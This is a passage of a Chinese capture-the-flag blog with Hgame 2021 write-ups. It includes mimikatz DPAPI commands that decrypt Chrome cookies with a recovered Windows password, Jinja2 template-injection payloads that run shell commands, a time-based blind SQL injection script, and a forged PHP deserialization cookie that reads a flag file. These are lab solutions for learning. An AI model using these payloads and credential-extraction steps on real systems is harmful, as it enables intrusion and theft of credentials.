A7E1F7361B63FA1C7387B3A0CC6ECFF7B9DBC55B938E33AD5AFADB5C0BE11C8CAD924B682A9EA68DC53616C2D3FAD16417A5E045E732F60F17DDF1A67BEEEB46CA9A0FFDD6A0B9D1E08F7DBE7087C5AA4B25700A197B0281801DF13A750AF298A60EEB0BC0B8582FB6830D4AE3D044796E6CBB67369D578A458BACCBD784DE0385C8367414A0C7EF9D5B1F163BF0F872A69CA4CEAC9E9437F7512A1EE55118A0D6FD30FC608E881FCABD1AC53DECC9FEAA4418D46A4C2ACA48CD0C8A9857EE8DC96C8395108A49574C116133C122BC2A207A43A2574BF1B59D0281805AA20E03051797AE14411B4679DB98DAE31445FEE75DCB3566142BDABDC1704B44A45D24119B67E5A47E6D1F0AEC491FFD3A90B85487E7BBAD2948676BEEDC06AEE82AD0673A5FF176D8CA26BA12E6E13F51C637923D90EE80A792A8698A4EAE91E8FC2C357B859D9BE5140C43C2BF5AB1CC2D70B3A4E9A94DF5C9028F13CFC102818100AAFE94334DE0035FE8673623497290B5D059E6176FB785D83A2EA157C2E3B335E2E264DC5D7EBB73E0348E7578D956F1AF59E81D9FC24FFB23A61B262184A0B06B4A0F79A750E0EFE776646CFF6ACDB2A2A4CFFBDEC64DA06F05A76A8028CC3E0D487A21C4EADA734DADEDC8280528892E07FBC98DC47B0E2ED1E69EDA479D05&gt;LastPassPrivateKey 得到 系统登录密码 vIg*q3x6GFa5aFBA。 看到有个 Cookies，发现是 Sqlite 数据库，是 Chrome 存放 Cookie 的。 又发现文件结尾 有个 localhostVeraCrypt/ 查了一下，VeraCrypt 是一种硬盘加密工具，盲猜 container 文件就是被加密的镜像了。 用 mimikatz 去解密 Cookies，发现需要 Masterkey。 mimikatz （后渗透工具，仅在 Windows 下使用 https://github.com/gentilkiwi/mimikatz mimikatz(commandline) # dpapi::chrome /in:secret\\Cookies /unprotect Host : localhost ( / ) Name : VeraCrypt Dates : 2021/2/19 14:08:59 -&gt; 2022/2/19 14:00:00 * using CryptUnprotectData API ERROR kuhl_m_dpapi_unprotect_raw_or_blob ; NTE_BAD_KEY_STATE, needed Masterkey is: {57935170-beab-4565-ba79-2b09570b95a6} 这个需要的 Masterkey 正好就和 S- 开头的文件夹里的文件名同名。 然后查了一堆资料（ 参考： Mimikatz之DPAPI学习与实践 Operational Guidance for Offensive User DPAPI Abuse [翻译]滥用User DPAPI进行攻击的操作指南（上面那篇的翻译） 通过Dpapi获取Windows身份凭证 后渗透攻防的信息收集 用系统登录密码去求解 Masterkey。 mimikatz(commandline) # dpapi::masterkey /in:secret\\S-1-5-21-262715442-3761430816-2198621988-1001\\57935170-beab-4565-ba79-2b09570b95a6 /password:vIg*q3x6GFa5aFBA **MASTERKEYS** dwVersion : 00000002 - 2 szGuid : {57935170-beab-4565-ba79-2b09570b95a6} dwFlags : 00000005 - 5 dwMasterKeyLen : 000000b0 - 176 dwBackupKeyLen : 00000090 - 144 dwCredHistLen : 00000014 - 20 dwDomainKeyLen : 00000000 - 0 [masterkey] **MASTERKEY** dwVersion : 00000002 - 2 salt : 0b6b5eb5eee1d3cc68d5e415cd3e4419 rounds : 000043f8 - 17400 algHash : 0000800e - 32782 (CALG_SHA_512) algCrypt : 00006610 - 26128 (CALG_AES_256) pbKey : e3d3a53699471473f53c2316e39b0276941fb3599f5931ec3dd1ff5dfdd7c528b9c2b0a05e5eb7d070b9035eceb7788fb43994bc43ccd68d2a5b05708366de098e8b4e77780cc5296608e628173e826973f2124fe1f4dbf71a5485cc31e537056cae79ad95b461f1c881d268194731ccb14d33148885c7d9244c88ae1a8ee150adc74c6ab5a67ea87b6fe4bd8f6cd9ac [backupkey] **MASTERKEY** dwVersion : 00000002 - 2 salt : 5e0428d80b0c876b249bbf53fe5d8ea8 rounds : 000043f8 - 17400 algHash : 0000800e - 32782 (CALG_SHA_512) algCrypt : 00006610 - 26128 (CALG_AES_256) pbKey : 7f5d3f666c489f4be5bb1784bbe140cd0c764267b3ec33760522a97e6282f98f1192fee7030a70728bb0b96196557dca96fb89edad1bf13deb5d5cf9fc1946cdd71cefc7aa42468e9f4ce64e5f04f84ce98b729316f65bac9534e913178dc7b8e0d6b2900c39b0bb911eeff84622cd9c [credhist] **CREDHIST INFO** dwVersion : 00000003 - 3 guid : {24465cc4-8981-41cc-b3ae-ff825294bce1} Auto SID from path seems to be: S-1-5-21-262715442-3761430816-2198621988-1001 [masterkey] with password: vIg*q3x6GFa5aFBA (normal user) key : 3cafd3d8e6a67edf67e6fa0ca0464a031949182b3e68d72ce9c08e22d7a720b5d2a768417291a28fb79c6def7d068f84955e774e87e37c6b0b669e05fb7eb6f8 sha1: 8fc9b889a47a7216d5b39c87f8192d84a9eb8c57 然后再用这个 Masterkey 解开 Cookie。 key/sha1 都行。 mimikatz(commandline) # dpapi::chrome /in:secret\\Cookies /masterkey:8fc9b889a47a7216d5b39c87f8192d84a9eb8c57 /unprotect Host : localhost ( / ) Name : VeraCrypt Dates : 2021/2/19 14:08:59 -&gt; 2022/2/19 14:00:00 * using CryptUnprotectData API * masterkey : 8fc9b889a47a7216d5b39c87f8192d84a9eb8c57 Cookie: !bWjAqM2z!iSoJsV*&amp;IRV@*AVI1VrtAb 得到 VeraCrypt 密钥 !bWjAqM2z!iSoJsV*&amp;IRV@*AVI1VrtAb。 https://www.veracrypt.fr/en/Downloads.html 挂载 container NTFS 文件流隐写 参考之前写的 关于 NTFS ADS 的一些总结 hgame{Which_0nly_cryin9_3yes_c4n_de5cribe} And you may be intertested in this bonus: https://eyes.hgame2021.cf 好套娃啊！ 哇！！！原来你们渗透都这么会玩的么！ BTW，查了一下，这题有点像 2019 国际赛 De1CTF DeepInReal，参考题解。 小结喵呜！ Hgame 2021 完结撒花！ 好耶，总榜第 20，没掉出第一页（爬走 今年好难得坚持每周都来看题目了 233. 玩的还算开心，就是有点头秃。 杭电的出题带师傅们也辛苦了。（这就去打出题人 （溜了溜了喵","path":"2021/03/04/CTF_2021HgameWeek4/"},{"title":"CTF | 2021 Hgame Week3 WriteUp","text":"引言Hgame 2021 Week 3 喵呜呜，第三周好难啊！ 这周过年比较忙，就随意看了看吧。 WebForgetful Liki 总是忘记很多事情，于是她灵机一动，用新学会的 Python 写了一个 TodoList，快用起来吧！ https://todolist.liki.link/ 查看 页面存在 SSTI. Payload: {{\"\"[\"\\x5f\\x5fcla\"\"ss\\x5f\\x5f\"][\"\\x5f\\x5fba\"\"se\\x5f\\x5f\"][\"\\x5f\\x5fsubcla\"\"sses\\x5f\\x5f\"]()[408][\"\\x5f\\x5fin\"\"it\\x5f\\x5f\"][\"\\x5f\\x5fglo\"\"bals\\x5f\\x5f\"][\"\\x5f\\x5fbuiltins\\x5f\\x5f\"][\"\\x5f\\x5fimport\\x5f\\x5f\"](\"os\")[\"popen\"](\"ls -al /\")[\"read\"]()}} total 104 drwxr-xr-x 1 root root 4096 Feb 11 16:13 . drwxr-xr-x 1 root root 4096 Feb 11 16:13 .. drwxr-xr-x 5 root root 4096 Feb 13 13:59 app drwxr-xr-x 1 root root 4096 Jun 4 2020 bd_build drwxr-xr-x 1 root root 4096 Jun 4 2020 bin drwxr-xr-x 2 root root 4096 Apr 24 2018 boot drwxr-xr-x 5 root root 340 Feb 14 14:00 dev -rwxr-xr-x 1 root root 0 Feb 11 16:13 .dockerenv drwxr-xr-x 1 root root 4096 Feb 13 14:48 etc -rw-r--r-- 1 root root 38 Feb 11 16:12 flag drwxr-xr-x 1 root root 4096 Feb 11 16:12 home drwxr-xr-x 1 root root 4096 Feb 11 16:12 lib drwxr-xr-x 1 root root 4096 Feb 11 16:12 lib64 drwxr-xr-x 2 root root 4096 Apr 3 2020 media drwxr-xr-x 2 root root 4096 Apr 3 2020 mnt drwxr-xr-x 2 root root 4096 Apr 3 2020 opt dr-xr-xr-x 217 root root 0 Feb 14 14:00 proc -rw-r--r-- 1 root root 122 Feb 11 15:10 requirements.txt drwx------ 1 root root 4096 Feb 11 16:12 root drwxr-xr-x 1 root root 4096 Jun 4 2020 run drwxr-xr-x 1 root root 4096 Jun 4 2020 sbin drwxr-xr-x 2 root root 4096 Apr 3 2020 srv dr-xr-xr-x 13 root root 0 Feb 13 12:31 sys drwxrwxrwt 1 root root 4096 Feb 14 11:40 tmp drwxr-xr-x 1 root root 4096 Apr 3 2020 usr drwxr-xr-x 1 root root 4096 Apr 3 2020 var 但是发现读不了根目录的 flag，发现 bash 或者 nc 也反弹不了 shell，emmm 然后试了 wc -l /flag 发现并没有被拦，其他文件也能读。（没过滤 flag cat 所以推测是 输出的字符串中如果出现关键字则拦截。 试试发现从后往前读可以，最终 payload： {{\"\"[\"\\x5f\\x5fcla\"\"ss\\x5f\\x5f\"][\"\\x5f\\x5fba\"\"se\\x5f\\x5f\"][\"\\x5f\\x5fsubcla\"\"sses\\x5f\\x5f\"]()[408][\"\\x5f\\x5fin\"\"it\\x5f\\x5f\"][\"\\x5f\\x5fglo\"\"bals\\x5f\\x5f\"][\"\\x5f\\x5fbuiltins\\x5f\\x5f\"][\"\\x5f\\x5fimport\\x5f\\x5f\"](\"os\")[\"popen\"](\"tail -c 35 /flag\")[\"read\"]()}} 或者 cat /flag|base64 也行。 hgame{h0w_4bou7+L3arn!ng~PythOn^Now?} 气死我了，这就去读源码。 {{\"\"[\"\\x5f\\x5fcla\"\"ss\\x5f\\x5f\"][\"\\x5f\\x5fba\"\"se\\x5f\\x5f\"][\"\\x5f\\x5fsubcla\"\"sses\\x5f\\x5f\"]()[408][\"\\x5f\\x5fin\"\"it\\x5f\\x5f\"][\"\\x5f\\x5fglo\"\"bals\\x5f\\x5f\"][\"\\x5f\\x5fbuiltins\\x5f\\x5f\"][\"\\x5f\\x5fimport\\x5f\\x5f\"](\"os\")[\"popen\"](\"ls -al\")[\"read\"]()}} total 40 drwxr-xr-x 5 root root 4096 Feb 13 13:59 . drwxr-xr-x 1 root root 4096 Feb 11 16:13 .. -rw-r--r-- 1 root root 5255 Feb 13 13:59 app.py -rw-r--r-- 1 root root 168 Feb 11 15:10 ext.py -rw-r--r-- 1 root root 945 Feb 11 15:10 forms.py -rw-r--r-- 1 root root 1048 Feb 11 15:10 models.py drwxr-xr-x 2 root root 4096 Feb 11 15:10 __pycache__ drwxr-xr-x 5 root root 4096 Feb 11 15:10 static drwxr-xr-x 2 root root 4096 Feb 11 15:10 templates app.py #!/usr/bin/python #-*- coding: UTF-8 -*- from __future__ import unicode_literals from flask import (Flask, render_template, redirect, url_for, request, flash) from jinja2 import Template from flask_bootstrap import Bootstrap from flask_login import login_required, login_user, logout_user, current_user from hashlib import md5 from forms import TodoListForm, LoginForm, RegisterForm from ext import db, login_manager from models import TodoList, User import pymysql pymysql.install_as_MySQLdb() SECRET_KEY = 'ssssssTiLIKISAMA' SALT = 'SIKILIKISAMA' app = Flask(__name__) bootstrap = Bootstrap(app) app.secret_key = SECRET_KEY app.config['SQLALCHEMY_DATABASE_URI'] = \"mysql://ctf:p45Sw0rdOfssti@ssti_database/todolist\" app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = True db.init_app(app) login_manager.init_app(app) login_manager.login_view = \"login\" @app.route('/', methods=['GET', 'POST']) @login_required def show_todo_list(): form = TodoListForm() if request.method == 'GET': todolists = TodoList.query.filter_by(user_id=current_user.id) return render_template('index.html', todolists=todolists, form=form) else: if form.validate_on_submit(): todolist = TodoList(current_user.id, form.title.data, form.status.data) db.session.add(todolist) db.session.commit() flash('You have ADD a new todo list') else: flash(form.errors) return redirect(url_for('show_todo_list')) @app.route('/delete/&lt;int:id&gt;') @login_required def delete_todo_list(id): user_id = TodoList.query.filter_by(id=id).first_or_404().user_id if (user_id == current_user.id): todolist = TodoList.query.filter_by(id=id).first_or_404() db.session.delete(todolist) db.session.commit() flash('You have DELETE a todo list') else: flash('You DO NOT have permission to delete this todo') return redirect(url_for('show_todo_list')) @app.route('/view/&lt;int:id&gt;', methods=['GET']) @login_required def view_todo_list(id): user_id = TodoList.query.filter_by(id=id).first_or_404().user_id if (user_id == current_user.id): try: todo = TodoList.query.filter_by(id=id).first_or_404() s = render_template('view.html', todo=todo) s = s.replace(\"lza9veb5WmH367fcuUyn\", todo.title) t = Template(s) r = t.render() if (('hgame' in r) or ('emagh' in r)): r = 'Stop!!!' r = 'Stop!!!' return r except: flash(\"Something went wrong!\") else: flash('You DO NOT have permission to view this todo') return redirect(url_for('show_todo_list')) @app.route('/modify/&lt;int:id&gt;', methods=['GET', 'POST']) @login_required def modify_todo_list(id): user_id = TodoList.query.filter_by(id=id).first_or_404().user_id if (user_id == current_user.id): if request.method == 'GET': todolist = TodoList.query.filter_by(id=id).first_or_404() form = TodoListForm() form.title.data = todolist.title form.status.data = str(todolist.status) return render_template('modify.html', form=form) else: form = TodoListForm() if form.validate_on_submit(): todolist = TodoList.query.filter_by(id=id).first_or_404() todolist.title = form.title.data todolist.status = form.status.data db.session.commit() flash('You have MODIFY a todolist') else: flash(form.errors) else: flash('You DO NOT have permission to modify this todo') return redirect(url_for('show_todo_list')) @app.route('/login', methods=['GET', 'POST']) def login(): if request.method == 'POST': pswd = md5((request.form['password'] + SALT).encode(encoding='UTF-8')).hexdigest() print(pswd) user = User.query.filter_by(username=request.form['username'], password=pswd).first() if user: login_user(user) flash('You have logged in!') return redirect(url_for('show_todo_list')) else: flash('Invalid username or password') form = LoginForm() return render_template('login.html', form=form) @app.route('/register', methods=['GET', 'POST']) def register(): if request.method == 'POST': pswd = md5((request.form['password'] + SALT).encode(encoding='UTF-8')).hexdigest() print(pswd) newuser = User(username=request.form['username'], password=pswd) user = db.session.add(newuser) try: db.session.commit() flash('You have registered!') return redirect(url_for('login')) except: flash('Username Exists') form = RegisterForm() return render_template('register.html', form=form) @app.route('/logout') @login_required def logout(): logout_user() flash('You have logout!') return redirect(url_for('login')) @login_manager.user_loader def load_user(user_id): return User.query.filter_by(id=int(user_id)).first() if __name__ == '__main__': app.run(host='0.0.0.0', port=5000, debug=False) 果然是检查渲染后的结果里是否有 hgame 或者 emagh，有的话就直接返回 Stop!!!。 居然有个 MySQL 数据库，嘿嘿信息都有了。 Liki-Jail 漫长的追捕结束了，作恶多端的 Switch 被警官 Liki 捉拿归案，关押在离奇监狱 不过 Switch 好像有着不可告人的秘密，有着必须要完成的事情，他必须要逃离监狱 不巧的是监狱管理系统刚好正在维护，只有管理员可以登录系统，该怎么办呢…… https://jailbreak.liki.link/ 过滤了 空格 - ' \" = 用 \\ 转义掉引号，试了试 username=\\, password=/**/Or/**/sleep(10)# 果然能够 sleep。 于是就是 基于时间的盲注 了。 然后又是 SQL 注入环节。 Exp: 注意 Content-Type 要加上 application/x-www-form-urlencoded，不然么得反应。 = 用 like 绕过，但是 like 默认不区分大小写，所以需要 like binary. 空格用 /**/ 绕过。 MySQL 里含有特殊字符可以用 反引号包起来，如 (`blal@b@la`)。 # coding: utf-8 \"\"\" 时间盲注脚本 MiaoTony \"\"\" import requests import time from urllib.parse import urlencode header = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0\", \"Referer\": \"https://jailbreak.liki.link/\", \"Host\": \"jailbreak.liki.link\", \"Content-Type\": \"application/x-www-form-urlencoded\" } def get_len(password: str): # 获取数据库长度 print(\"start get length...\") url = \"https://jailbreak.liki.link/login.php\" for i in range(1, 30): payload = {} payload[\"username\"] = \"\\\\\" payload[\"password\"] = password.format(i=i) payload = urlencode(payload) # print(payload) startTime = time.time() r = requests.post(url, data=payload, headers=header) r.encoding = 'utf-8' # print(r.text) if time.time() - startTime &gt;= 1: break print(\"length:\", i) def get_name(password: str, length: int): # 获取数据库名 url = \"https://jailbreak.liki.link/login.php\" name = '' for j in range(1, length + 1): for i in '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@#$%': print(i, '...') s = hex(ord(i)) payload = {} payload[\"username\"] = \"\\\\\" payload[\"password\"] = password.format(j=j, s=s) payload = urlencode(payload) # print(payload) # payload = r\"username=%5C&amp;password=%2F**%2FoR%2F**%2Fif%28length%28database%28%29%29likE%2F**%2F9%2Csleep%283%29%2C1%29%23\" startTime = time.time() r = requests.post(url, data=payload, headers=header) r.encoding = 'utf-8' # print(r.text) if time.time() - startTime &gt;= 1: name += i print('====&gt;', name) break print('name:', name) def main(): # db_len = \"/**/oR/**/if(length(database())likE/**/{i},sleep(1),1)#\" # get_len(db_len) # # 9 # db_name = \"/**/oR/**/if(substr(database(),{j},1)liKe/**/{s},sleep(1),1)#\" # get_name(db_name, 9) # # week3sqli # table_len = \"/**/oR/**/if((seleCt/**/lenGth(table_name)liKe/**/{i}/**/fRom/**/information_schema.tables/**/wHere/**/table_schema/**/liKe/**/database()/**/limit/**/0,1),sleep(1),1)#\" # get_len(table_len) # # 5 # table_name = \"/**/oR/**/if((seLect/**/subStr(table_name,{j},1)liKe/**/{s}/**/fRom/**/information_schema.tables/**/wHere/**/table_schema/**/liKe/**/database()/**/limIt/**/0,1),sleep(1),1)#\" # get_name(table_name, 5) # # u5ers # column_len = \"/**/oR/**/if((seleCt/**/lenGth(column_name)liKe/**/{i}/**/fRom/**/information_schema.columns/**/wHere/**/table_name/**/liKe/**/0x7535657273/**/limit/**/0,1),sleep(1),1)#\" # get_len(column_len) # # 8 # column_name = \"/**/oR/**/if((seLect/**/subStr(column_name,{j},1)liKe/**/{s}/**/fRom/**/information_schema.columns/**/wHere/**/table_name/**/liKe/**/0x7535657273/**/limIt/**/1,1),sleep(1),1)#\" # get_name(column_name, 8) # # usern@me, p@ssword # username_len = \"/**/oR/**/if((seLect/**/lenGth(`usern@me`)liKe/**/{i}/**/fRom/**/u5ers/**/lImit/**/0,1),sleep(1),1)#\" # get_len(username_len) # # 5 # password_len = \"/**/oR/**/if((seLect/**/lenGth(`p@ssword`)liKe/**/{i}/**/fRom/**/u5ers/**/lImit/**/0,1),sleep(1),1)#\" # get_len(password_len) # # 24 # username = \"/**/oR/**/if((seLect/**/subStr(`usern@me`,{j},1)liKe/**/binary/**/{s}/**/fRom/**/u5ers/**/limIt/**/0,1),sleep(1),1)#\" # get_name(username, 5) # # admin password = \"/**/oR/**/if((seLect/**/subStr(`p@ssword`,{j},1)liKe/**/binary/**/{s}/**/fRom/**/u5ers/**/limIt/**/0,1),sleep(1),1)#\" get_name(password, 24) # sOme7hiNgseCretw4sHidd3n if __name__ == '__main__': main() 最后登录拿到 flag。 hgame{7imeB4se_injeCti0n+hiDe~th3^5ecRets} Arknights r4u十连了！r4u没出夕和年！r4u自闭了！r4u写了个抽卡模拟器想要证明自己不是非酋，这一切都是鹰角的错。r4u用git部署到了自己的服务器上，然而这一切都被大黑客liki看在了眼里。 flag位于网站根目录flag.php中 http://84f327c77d.arknights.r4u.top 好耶，是 git 泄露！ 先把源码拉下来。 index.php &lt;?php error_reporting(0); require_once (\"simulator.php\"); $simulator = new Simulator(); $cards = array(); if(isset($_POST[\"draw\"])){ $cards = $simulator-&gt;draw($_POST[\"draw\"]); } ?&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;title&gt;Arknights&lt;/title&gt; &lt;meta charset=\"utf-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"&gt; &lt;link href=\"static/css/bootstrap.min.css\" rel=\"stylesheet\"&gt; &lt;link href=\"/static/css/cover.css\" rel=\"stylesheet\"&gt; &lt;/head&gt; &lt;body class=\"text-center\"&gt; &lt;div class=\"d-flex w-100 h-100 p-3 mx-auto flex-column\"&gt; &lt;header class=\"mastfoot mt-auto\"&gt; &lt;h1&gt;非酋证明器&lt;/h1&gt; &lt;br&gt; &lt;br&gt; &lt;/header&gt; &lt;main style=\"height: 85%\"&gt; &lt;div class=\"card own\"&gt; &lt;h5 class=\"card-header\" style=\"color: blue\"&gt;抽中的六星干员&lt;/h5&gt; &lt;div class=\"card-body\"&gt; &lt;?php $legendary = $simulator-&gt;getLegendary(); foreach ($legendary as $worker){ echo \"&lt;p class='legendary'&gt;\".$worker[\"type\"].\" \".$worker[\"name\"].\"&lt;/p&gt;\"; } ?&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"card col-md-3\" style=\"color: #007bff;width=100%;\"&gt; &lt;h5 class=\"card-header\"&gt;刀客塔，你要老婆不要？&lt;/h5&gt; &lt;div class=\"card-body\"&gt; &lt;?php if(!empty($cards)){ echo \"&lt;h5 class=\\\"card-title\\\"&gt;抽卡结果：&lt;/h5&gt;\"; echo \"&lt;br&gt;\"; } foreach ($cards as $card){ switch ($card[\"stars\"]){ case 3: echo \"&lt;p class='normal'&gt;\".$card[\"card\"][\"star\"].\" \".$card[\"card\"][\"type\"].\" \".$card[\"card\"][\"name\"].\"&lt;/p&gt;\"; break; case 4: echo \"&lt;p class='rare'&gt;\".$card[\"card\"][\"star\"].\" \".$card[\"card\"][\"type\"].\" \".$card[\"card\"][\"name\"].\"&lt;/p&gt;\"; break; case 5: echo \"&lt;p class='epic'&gt;\".$card[\"card\"][\"star\"].\" \".$card[\"card\"][\"type\"].\" \".$card[\"card\"][\"name\"].\"&lt;/p&gt;\"; break; case 6: echo \"&lt;p class='legendary'&gt;\".$card[\"card\"][\"star\"].\" \".$card[\"card\"][\"type\"].\" \".$card[\"card\"][\"name\"].\"&lt;/p&gt;\"; break; } } ?&gt; &lt;br&gt; &lt;hr&gt; &lt;form method=\"POST\" action=\"\"&gt; &lt;button class=\"btn btn-primary\" name=\"draw\" value=\"1\"&gt;抽一次&lt;/button&gt; &lt;button class=\"btn btn-primary\" name=\"draw\" value=\"10\"&gt;连连连连连连连连连连!&lt;/button&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;/main&gt; &lt;footer class=\"mastfoot mt-auto\"&gt; &lt;p&gt;Made by 109发抽不到&lt;del&gt;老婆&lt;/del&gt;夕的&lt;b&gt;R4u&lt;/b&gt;.&lt;/p&gt; &lt;/footer&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; simulator.php &lt;?php class Simulator{ public $session; public $cardsPool; public function __construct(){ $this-&gt;session = new Session(); if(array_key_exists(\"session\", $_COOKIE)){ $this-&gt;session-&gt;extract($_COOKIE[\"session\"]); } $this-&gt;cardsPool = new CardsPool(\"./pool.php\"); $this-&gt;cardsPool-&gt;init(); } public function draw($count){ $result = array(); for($i=0; $i&lt;$count; $i++){ $card = $this-&gt;cardsPool-&gt;draw(); if($card[\"stars\"] == 6){ $this-&gt;session-&gt;set('', $card[\"No\"]); } $result[] = $card; } $this-&gt;session-&gt;save(); return $result; } public function getLegendary(){ $six = array(); $data = $this-&gt;session-&gt;getAll(); foreach ($data as $item) { $six[] = $this-&gt;cardsPool-&gt;cards[6][$item]; } return $six; } } class CardsPool { public $cards; private $file; public function __construct($filePath) { if (file_exists($filePath)) { $this-&gt;file = $filePath; } else { die(\"Cards pool file doesn't exist!\"); } } public function draw() { $rand = mt_rand(1, 100); $level = 0; if ($rand &gt;= 1 &amp;&amp; $rand &lt;= 42) { $level = 3; } elseif ($rand &gt;= 43 &amp;&amp; $rand &lt;= 90) { $level = 4; } elseif ($rand &gt;= 91 &amp;&amp; $rand &lt;= 99) { $level = 5; } elseif ($rand == 100) { $level = 6; } $rand_key = array_rand($this-&gt;cards[$level]); return array( \"stars\" =&gt; $level, \"No\" =&gt; $rand_key, \"card\" =&gt; $this-&gt;cards[$level][$rand_key] ); } public function init() { $this-&gt;cards = include($this-&gt;file); } public function __toString(){ return file_get_contents($this-&gt;file); } } class Session{ private $sessionData; const SECRET_KEY = \"7tH1PKviC9ncELTA1fPysf6NYq7z7IA9\"; public function __construct(){} public function set($key, $value){ if(empty($key)){ $this-&gt;sessionData[] = $value; }else{ $this-&gt;sessionData[$key] = $value; } } public function getAll(){ return $this-&gt;sessionData; } public function save(){ $serialized = serialize($this-&gt;sessionData); $sign = base64_encode(md5($serialized . self::SECRET_KEY)); $value = base64_encode($serialized) . \".\" . $sign; setcookie(\"session\",$value); } public function extract($session){ $sess_array = explode(\".\", $session); $data = base64_decode($sess_array[0]); $sign = base64_decode($sess_array[1]); if($sign === md5($data . self::SECRET_KEY)){ $this-&gt;sessionData = unserialize($data); }else{ unset($this-&gt;sessionData); die(\"Go away! You hacker!\"); } } } class Eeeeeeevallllllll{ public $msg=\"坏坏liki到此一游\"; public function __destruct() { echo $this-&gt;msg; } } pool.php 里是一堆默认游戏配置 &lt;?php return array( 3 =&gt; array(//%42 array(\"star\" =&gt; \"★★★\", \"name\" =&gt; \"kokodayo~\", \"type\" =&gt; \"狙击\"), array(\"star\" =&gt; \"★★★\", \"name\" =&gt; \"泡普卡\", \"type\" =&gt; \"近卫\"), array(\"star\" =&gt; \"★★★\", \"name\" =&gt; \"炎熔\", \"type\" =&gt; \"术士\"), array(\"star\" =&gt; \"★★★\", \"name\" =&gt; \"斑点\", \"type\" =&gt; \"重装\"), array(\"star\" =&gt; \"★★★\", \"name\" =&gt; \"香草\", \"type\" =&gt; \"先锋\"), array(\"star\" =&gt; \"★★★\", \"name\" =&gt; \"粉毛猛男\", \"type\" =&gt; \"医疗\"), array(\"star\" =&gt; \"★★★\", \"name\" =&gt; \"翎羽\", \"type\" =&gt; \"先锋\"), array(\"star\" =&gt; \"★★★\", \"name\" =&gt; \"泡普卡\", \"type\" =&gt; \"近卫\"), array(\"star\" =&gt; \"★★★\", \"name\" =&gt; \"卡缇\", \"type\" =&gt; \"重装\"), array(\"star\" =&gt; \"★★★\", \"name\" =&gt; \"米格鲁\", \"type\" =&gt; \"重装\"), array(\"star\" =&gt; \"★★★\", \"name\" =&gt; \"安德切尔\", \"type\" =&gt; \"狙击\"), array(\"star\" =&gt; \"★★★\", \"name\" =&gt; \"芙蓉\", \"type\" =&gt; \"医疗\"), array(\"star\" =&gt; \"★★★\", \"name\" =&gt; \"梓兰\", \"type\" =&gt; \"特种\") ), //...... ); 关键的源码在 simulator.php 里，可以看到有 __construct() __toString() file_get_contents 反序列化漏洞 那就构造利用链好了。 注意到 Eeeeeeevallllllll 类里有 echo，让这个 msg 指向 CardsPool('flag.php') 对象，就能在Eeeeeeevallllllll 实例化的对象销毁的时候调用 CardsPool 对象的 __toString()，通过 file_get_contents 来读取 flag 文件了。 Exp: 直接在 simulator 文件结尾加上这几条语句。 $xx = new Eeeeeeevallllllll(); $xx-&gt;msg = new CardsPool('flag.php'); echo \"&lt;br&gt;\"; $yy = serialize($xx); echo $yy; echo \"&lt;br&gt;\"; $sign = base64_encode(md5($yy . \"7tH1PKviC9ncELTA1fPysf6NYq7z7IA9\")); $value = base64_encode($yy) . \".\" . $sign; echo $value; 得到序列化的字符串 以及 加密的字符串 O:17:\"Eeeeeeevallllllll\":1:{s:3:\"msg\";O:9:\"CardsPool\":2:{s:5:\"cards\";N;s:15:\"CardsPoolfile\";s:8:\"flag.php\";}} TzoxNzoiRWVlZWVlZXZhbGxsbGxsbGwiOjE6e3M6MzoibXNnIjtPOjk6IkNhcmRzUG9vbCI6Mjp7czo1OiJjYXJkcyI7TjtzOjE1OiIAQ2FyZHNQb29sAGZpbGUiO3M6ODoiZmxhZy5waHAiO319.Y2Q1NjAzYWE3MjAxOWEwM2NjOWEwY2ZkNzk0ZmEwNzQ= 改 cookies 再访问即可拿到 flag。 Post to zuckonit2.0 d1gg12 的博客被日穿以后，他想办法学了更深入的 XSS 防护方法， 现在这个博客看上去已经坚不可摧了…是这样吗？ http://zuckonit-2.0727.site:5000/ 还是 XSS。 给了源码在 /static/www.zip app.py @app.route('/') def home(): response = make_response(render_template(\"index.html\")) response.headers['Set-Cookie'] = \"token=WELCOME TO HGAME 2021.;\" response.headers['Content-Security-Policy'] = \"default-src 'self'; script-src 'self';\" return response @app.route('/preview') def preview(): if session.get('substr') and session.get('replacement'): substr = session['substr'] replacement = session['replacement'] else: substr = \"\" replacement = \"\" response = make_response( render_template(\"preview.html\", substr=substr, replacement=replacement)) return response @app.route('/send', methods=['POST']) def send(): if request.form.get('content'): content = escape_index(request.form['content']) if session.get('contents'): content_list = session['contents'] content_list.append(content) else: content_list = [content] session['contents'] = content_list return \"post has been sent.\" else: return \"WELCOME TO HGAME 2021 :)\" @app.route('/replace', methods=[\"POST\"]) def replace(): if request.form.get('substr') and request.form.get('replacement'): session['substr'] = escape_replace(request.form['substr']) session['replacement'] = escape_replace(request.form['replacement']) return \"replace success\" else: return \"There is no content to replace any more\" @app.route('/contents', methods=[\"GET\"]) def get_contents(): if session.get('contents'): content_list = jsonify(session['contents']) else: content_list = jsonify('&lt;i&gt;2021-02-12&lt;/i&gt;&lt;p&gt;Happy New Year every guys! ' 'Maybe it is nearly done now.&lt;/p&gt;', '&lt;i&gt;2021-02-11&lt;/i&gt;&lt;p&gt;Busy preparing for the Chinese New Year... ' 'And I add some new features to this editor, maybe you can take a try. ' 'But it has not done yet, I\\'m not sure if it can be safe from attacks.&lt;/p&gt;', '&lt;i&gt;2021-02-07&lt;/i&gt;&lt;p&gt;so many hackers here, I am going to add some strict rules.&lt;/p&gt;', '&lt;i&gt;2021-02-06&lt;/i&gt;&lt;p&gt;I have tried to learn HTML the whole yesterday, ' 'and I finally made this ONLINE BLOG EDITOR. Feel free to write down your thoughts.&lt;/p&gt;', '&lt;i&gt;2021-02-05&lt;/i&gt;&lt;p&gt;Yesterday, I watched &lt;i&gt;The Social Network&lt;/i&gt;. ' 'It really astonished me. Something flashed me.&lt;/p&gt;') return content_list @app.route('/code', methods=[\"GET\"]) def get_code(): if session.get('code'): return Response(response=json.dumps({'code': session['code']}), status=200, mimetype='application/json') else: code = create_code() session['code'] = code return Response(response=json.dumps({'code': code}), status=200, mimetype='application/json') @app.route('/flag') def show_flag(): if request.cookies.get('token') == 